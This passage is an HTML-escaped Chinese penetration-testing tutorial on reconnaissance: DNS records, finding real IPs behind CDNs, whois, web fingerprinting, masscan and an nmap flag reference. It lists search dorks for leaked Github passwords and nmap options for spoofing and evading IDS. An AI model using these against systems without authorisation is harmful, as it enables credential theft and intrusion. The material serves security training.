邮箱交换记录&lt;/li&gt;\n&lt;li&gt;NS 服务器记录&lt;/li&gt;\n&lt;li&gt;SOA 权威记录&lt;/li&gt;\n&lt;li&gt;TXT 为记录说明&lt;/li&gt;\n&lt;li&gt;SRV 列出了正在提供特定服务的服务器&lt;/li&gt;\n&lt;li&gt;AAAA ipv6地址记录\nA (Address) 记录也叫主机记录，是用来指定域名对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的网页服务器(web server)上。同时也可以设置域名的子域名。通俗来说A记录就是服务器的IP，域名绑定A记录就是告诉DNS，当输入域名的时候给你引导向设置在DNS的A记录所对应的服务器。在命令行下可以通过nslookup -qt=a &lt;a href=\&quot;http://www.baidu.com%E6%9D%A5%E6%9F%A5%E7%9C%8BA%E8%AE%B0%E5%BD%95%E3%80%82\&quot;&gt;www.baidu.com来查看A记录。&lt;/a&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/14.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=\&quot;网站漏洞\&quot;&gt;网站漏洞&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网站漏洞\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址&lt;/p&gt;\n&lt;h3 id=\&quot;censys查询ssl证书找到真实ip\&quot;&gt;Censys查询SSL证书找到真实IP&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#censys查询ssl证书找到真实ip\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在&lt;a href=\&quot;https://crt.xn--shSSLHASH-rb6nx5at77oxxownaz80pknbhz7al4su67c\&quot;&gt;https://crt.sh上查找目标网站SSL证书的HASH&lt;/a&gt;，然后再用Censys搜索该HASH即可得到真实IP地址。&lt;/p&gt;\n&lt;h2 id=\&quot;域名的whois信息\&quot;&gt;域名的whois信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#域名的whois信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。&lt;/p&gt;\n&lt;p&gt;查询的网站：&lt;a href=\&quot;http://whois.chinaz.com/\&quot;&gt;http://whois.chinaz.com/&lt;/a&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;公司敏感信息收集\&quot;&gt;公司敏感信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#公司敏感信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。&lt;/p&gt;\n&lt;p&gt;在渗透测试的信息收集阶段，可以去Github和码云上搜索与目标有关的信息，或者就有意想不到的收获。(有些开发人员将代码上传到代码库的时候，有可能连一些重要的配置信息也上传了)&lt;/p&gt;\n&lt;h2 id=\&quot;github的搜索\&quot;&gt;Github的搜索&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#github的搜索\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;访问&lt;a href=\&quot;https://github.com/%EF%BC%9BGithub%E7%9A%84%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95%EF%BC%9A\&quot;&gt;https://github.com/；Github的搜索语法：&lt;/a&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;in:name test #仓库标题搜索含有关键字 SpringCloud&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;in:descripton test #仓库描述搜索含有关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;in:readme test #Readme文件搜素含有关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;stars:&gt;3000 test #stars数量大于3000的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;stars:1000..3000 test #stars数量大于1000小于3000的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;forks:&gt;1000 test #forks数量大于1000的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;forks:1000..3000 test #forks数量大于1000小于3000的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;size:&gt;=5000 test #指定仓库大于5000k(5M)的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;user:test #用户名搜素&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;language:java test #在java语言的代码中搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;user:test in:name test #组合搜索,用户名test的标题含有test的&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;使用-github-进行邮件配置信息收集\&quot;&gt;使用 Github 进行邮件配置信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用-github-进行邮件配置信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp @qq.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp @126.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp @163.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp @sina.com.cn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com String password smtp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;……&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;我们也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的\n&lt;code&gt;site:Github.com smtp @baidu.com&lt;/code&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;使用github进行数据库信息收集\&quot;&gt;使用Github进行数据库信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用github进行数据库信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com sa password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com root password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com User ID=’sa’;Password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com inurl:sql&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;使用github进行-svn-信息收集\&quot;&gt;使用Github进行 SVN 信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用github进行-svn-信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com svn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com svn username&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com svn password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com svn username password&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;使用github进行综合信息收集\&quot;&gt;使用Github进行综合信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用github进行综合信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com ftp ftppassword&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com 密码&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;网站指纹识别\&quot;&gt;网站指纹识别&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网站指纹识别\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。\n常见的网站指纹识别工具有：whatweb等。\n在线指纹识别网站：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;BugScaner：&lt;a href=\&quot;http://whatweb.bugscaner.com/look/\&quot;&gt;http://whatweb.bugscaner.com/look/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;云悉指纹：&lt;a href=\&quot;http://www.yunsee.cn/finger.html\&quot;&gt;http://www.yunsee.cn/finger.html&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;WhatWeb：&lt;a href=\&quot;https://whatweb.net/\&quot;&gt;https://whatweb.net/&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h1 id=\&quot;整站分析\&quot;&gt;整站分析&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#整站分析\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;服务器类型linuxwindows\&quot;&gt;服务器类型（Linux/windows）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#服务器类型linuxwindows\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的&lt;/p&gt;\n&lt;p&gt;而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来&lt;/p&gt;\n&lt;h2 id=\&quot;网站容器apachenginxtomcatiis\&quot;&gt;网站容器（Apache/Nginx/Tomcat/IIS）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网站容器apachenginxtomcatiis\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&amp;#x3C;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞&lt;/p&gt;\n&lt;h2 id=\&quot;脚本类型phpjspaspaspx\&quot;&gt;脚本类型（php/jsp/asp/aspx）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#脚本类型phpjspaspaspx\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;可以根据网站URL来判断&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;site:xxx filetype:php&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;可以根据Firefox的插件来判断&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&quot;数据库类型mysqloracleaccesssqlserver\&quot;&gt;数据库类型（Mysql/Oracle/Access/SQLserver）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#数据库类型mysqloracleaccesssqlserver\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的&lt;/p&gt;\n&lt;p&gt;几种数据库的区别:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb   一般是asp的网页文件用access数据库&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。&lt;/p&gt;\n&lt;p&gt;常见搭配：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;ASP 和 ASPX：ACCESS、SQL Server&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;PHP：MySQL、PostgreSQL&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;JSP：Oracle、MySQL&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h1 id=\&quot;第六章主机扫描\&quot;&gt;第六章主机扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#第六章主机扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。&lt;/p&gt;\n&lt;p&gt;主机扫描的工具也有很多，比如：Nessus、AWVS&lt;/p&gt;\n&lt;h1 id=\&quot;第七章端口扫描nmap\&quot;&gt;第七章端口扫描（nmap）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#第七章端口扫描nmap\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;22——&gt;ssh弱口令&lt;/li&gt;\n&lt;li&gt;873——&gt;rsync未授权访问漏洞&lt;/li&gt;\n&lt;li&gt;306——&gt;mysql弱口令&lt;/li&gt;\n&lt;li&gt;6379——&gt;redis未授权访问漏洞\n端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。\nmasscan示例 ：&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;masscan 192.168.10.152 -p 0-65535 --rate=10000&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;nmap简介\&quot;&gt;nmap简介&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nmap简介\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;nmap四项基本功能：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;主机发现 (Host Discovery)\n-sn,-PE/PP/PM&lt;/li&gt;\n&lt;li&gt;端口扫描 (Port Scanning)\n-sS,-sT,-sA, -sN/sF/sX,-sU, -sY/-sZ&lt;/li&gt;\n&lt;li&gt;版本侦测 (Version Detection)\n-sV（可查看自定义的端口服务）&lt;/li&gt;\n&lt;li&gt;操作系统侦测 (Operating System Detection)\n-O，-osscan-limit,-osscan-guess,\n而在这四项功能的基础上，nmap还提供防火墙和 IDS 的规避技巧，可以综合运用到四个基本功能的各个阶段。另外nmap还提供强大的NSE(Nmap Scripting Language)脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n&lt;strong&gt;nmap参数&lt;/strong&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;nmap –iflist : 查看本地主机的接口信息和路由信息&lt;/p&gt;\n&lt;p&gt;-A ：选项用于使用进攻性方式扫描&lt;/p&gt;\n&lt;p&gt;-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4&lt;/p&gt;\n&lt;p&gt;-oX test.xml： 将扫描结果生成 test.xml 文件，如果中断，则结果打不开&lt;/p&gt;\n&lt;p&gt;-oA test.xml: 将扫描结果生成 test.xml 文件，中断后，结果也可保存&lt;/p&gt;\n&lt;p&gt;-oG test.txt: 将扫描结果生成 test.txt 文件&lt;/p&gt;\n&lt;p&gt;-sn : 只进行主机发现，不进行端口扫描&lt;/p&gt;\n&lt;p&gt;-O : 指定Nmap进行系统版本扫描&lt;/p&gt;\n&lt;p&gt;-sV: 指定让Nmap进行服务版本扫描&lt;/p&gt;\n&lt;p&gt;-p &amp;#x3C;port ranges&gt;: 扫描指定的端口&lt;/p&gt;\n&lt;p&gt;-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描&lt;/p&gt;\n&lt;p&gt;-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况&lt;/p&gt;\n&lt;p&gt;-script &amp;#x3C;script name&gt; : 指定扫描脚本&lt;/p&gt;\n&lt;p&gt;-Pn ： 不进行ping扫描&lt;/p&gt;\n&lt;p&gt;-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping&lt;/p&gt;\n&lt;p&gt;-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。&lt;/p&gt;\n&lt;p&gt;-iL 1.txt : 批量扫描1.txt中的目标地址&lt;/p&gt;\n&lt;p&gt;-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现&lt;/p&gt;\n&lt;p&gt;-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况&lt;/p&gt;\n&lt;p&gt;-sO: 使用IP protocol 扫描确定目标机支持的协议类型&lt;/p&gt;\n&lt;p&gt;-PO : 使用IP协议包探测对方主机是否开启&lt;/p&gt;\n&lt;p&gt;-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机&lt;/p&gt;\n&lt;p&gt;-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现&lt;/p&gt;\n&lt;p&gt;-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态&lt;/p&gt;\n&lt;p&gt;-e eth0：指定使用eth0网卡进行探测&lt;/p&gt;\n&lt;p&gt;-f : —mtu &amp;#x3C;val&gt;: 指定使用分片、指定数据包的 MTU.&lt;/p&gt;\n&lt;p&gt;-b &amp;#x3C;FTP relay host&gt;: 使用FTP bounce scan扫描方式&lt;/p&gt;\n&lt;p&gt;-g： 指定发送的端口号&lt;/p&gt;\n&lt;p&gt;-r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）&lt;/p&gt;\n&lt;p&gt;-v 表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态&lt;/p&gt;\n&lt;p&gt;-n : 表示不进行DNS解析；&lt;/p&gt;\n&lt;p&gt;-D &amp;#x3C;decoy1,decoy2[,ME],…&gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址&lt;/p&gt;\n&lt;p&gt;-R ：表示总是进行DNS解析。&lt;/p&gt;\n&lt;p&gt;-F : 快速模式，仅扫描TOP 100的端口&lt;/p&gt;\n&lt;p&gt;-S &amp;#x3C;IP_Address&gt;: 伪装成其他 IP 地址&lt;/p&gt;\n&lt;p&gt;—ttl &amp;#x3C;val&gt;: 设置 time-to-live 时间&lt;/p&gt;\n&lt;p&gt;—badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）&lt;/p&gt;\n&lt;p&gt;—dns-servers : 指定DNS服务器&lt;/p&gt;\n&lt;p&gt;—system-dns : 指定使用系统的DNS服务器&lt;/p&gt;\n&lt;p&gt;—traceroute : 追踪每个路由节点&lt;/p&gt;\n&lt;p&gt;—scanflags &amp;#x3C;flags&gt;: 定制TCP包的flags&lt;/p&gt;\n&lt;p&gt;—top-ports &amp;#x3C;number&gt; :扫描开放概率最高的number个端口&lt;/p&gt;\n&lt;p&gt;—port-ratio &amp;#x3C;ratio&gt;: 扫描指定频率以上的端口。与上述—top-ports类似，这里以概率作为参数&lt;/p&gt;\n&lt;p&gt;—version-trace: 显示出详细的版本侦测过程信息&lt;/p&gt;\n&lt;p&gt;—osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）&lt;/p&gt;\n&lt;p&gt;—osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统&lt;/p&gt;\n&lt;p&gt;—data-length &amp;#x3C;num&gt;: 填充随机数据让数据包长度达到 Num&lt;/p&gt;\n&lt;p&gt;—ip-options &amp;#x3C;options&gt;: 使用指定的 IP 选项来发送数据包&lt;/p&gt;\n&lt;p&gt;—spoof-mac &amp;#x3C;mac address/prefix/vendor name&gt; : 伪装 MAC 地址&lt;/p&gt;\n&lt;p&gt;—version-intensity &amp;#x3C;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。&lt;/p&gt;\n&lt;p&gt;—version-light: 指定使用轻量侦测方式 (intensity 2)&lt;/p&gt;\n&lt;p&gt;—version-all: 尝试使用所有的probes进行侦测 (intensity 9)&lt;/p&gt;\n&lt;p&gt;—version-trace: 显示出详细的版本侦测过程信息&lt;/p&gt;\n&lt;p&gt;nmap 192.168.1.0/24 -exclude 192.168.1.10 #扫描除192.168.1.0外的该网段的其他地址&lt;/p&gt;\n&lt;p&gt;nmap 192.168.1.0/24 -excludefile f:/1.txt #扫描除给定文件中的地址以外的其他地址&lt;/p&gt;\n&lt;h2 id=\&quot;nmap基本功能\&quot;&gt;nmap基本功能&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nmap基本功能\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;探测目标主机是否在线\&quot;&gt;探测目标主机是否在线&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#探测目标主机是否在线\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h5 id=\&quot;当探测公网ip时\&quot;&gt;当探测公网IP时&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#当探测公网ip时\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;&lt;strong&gt;nmap 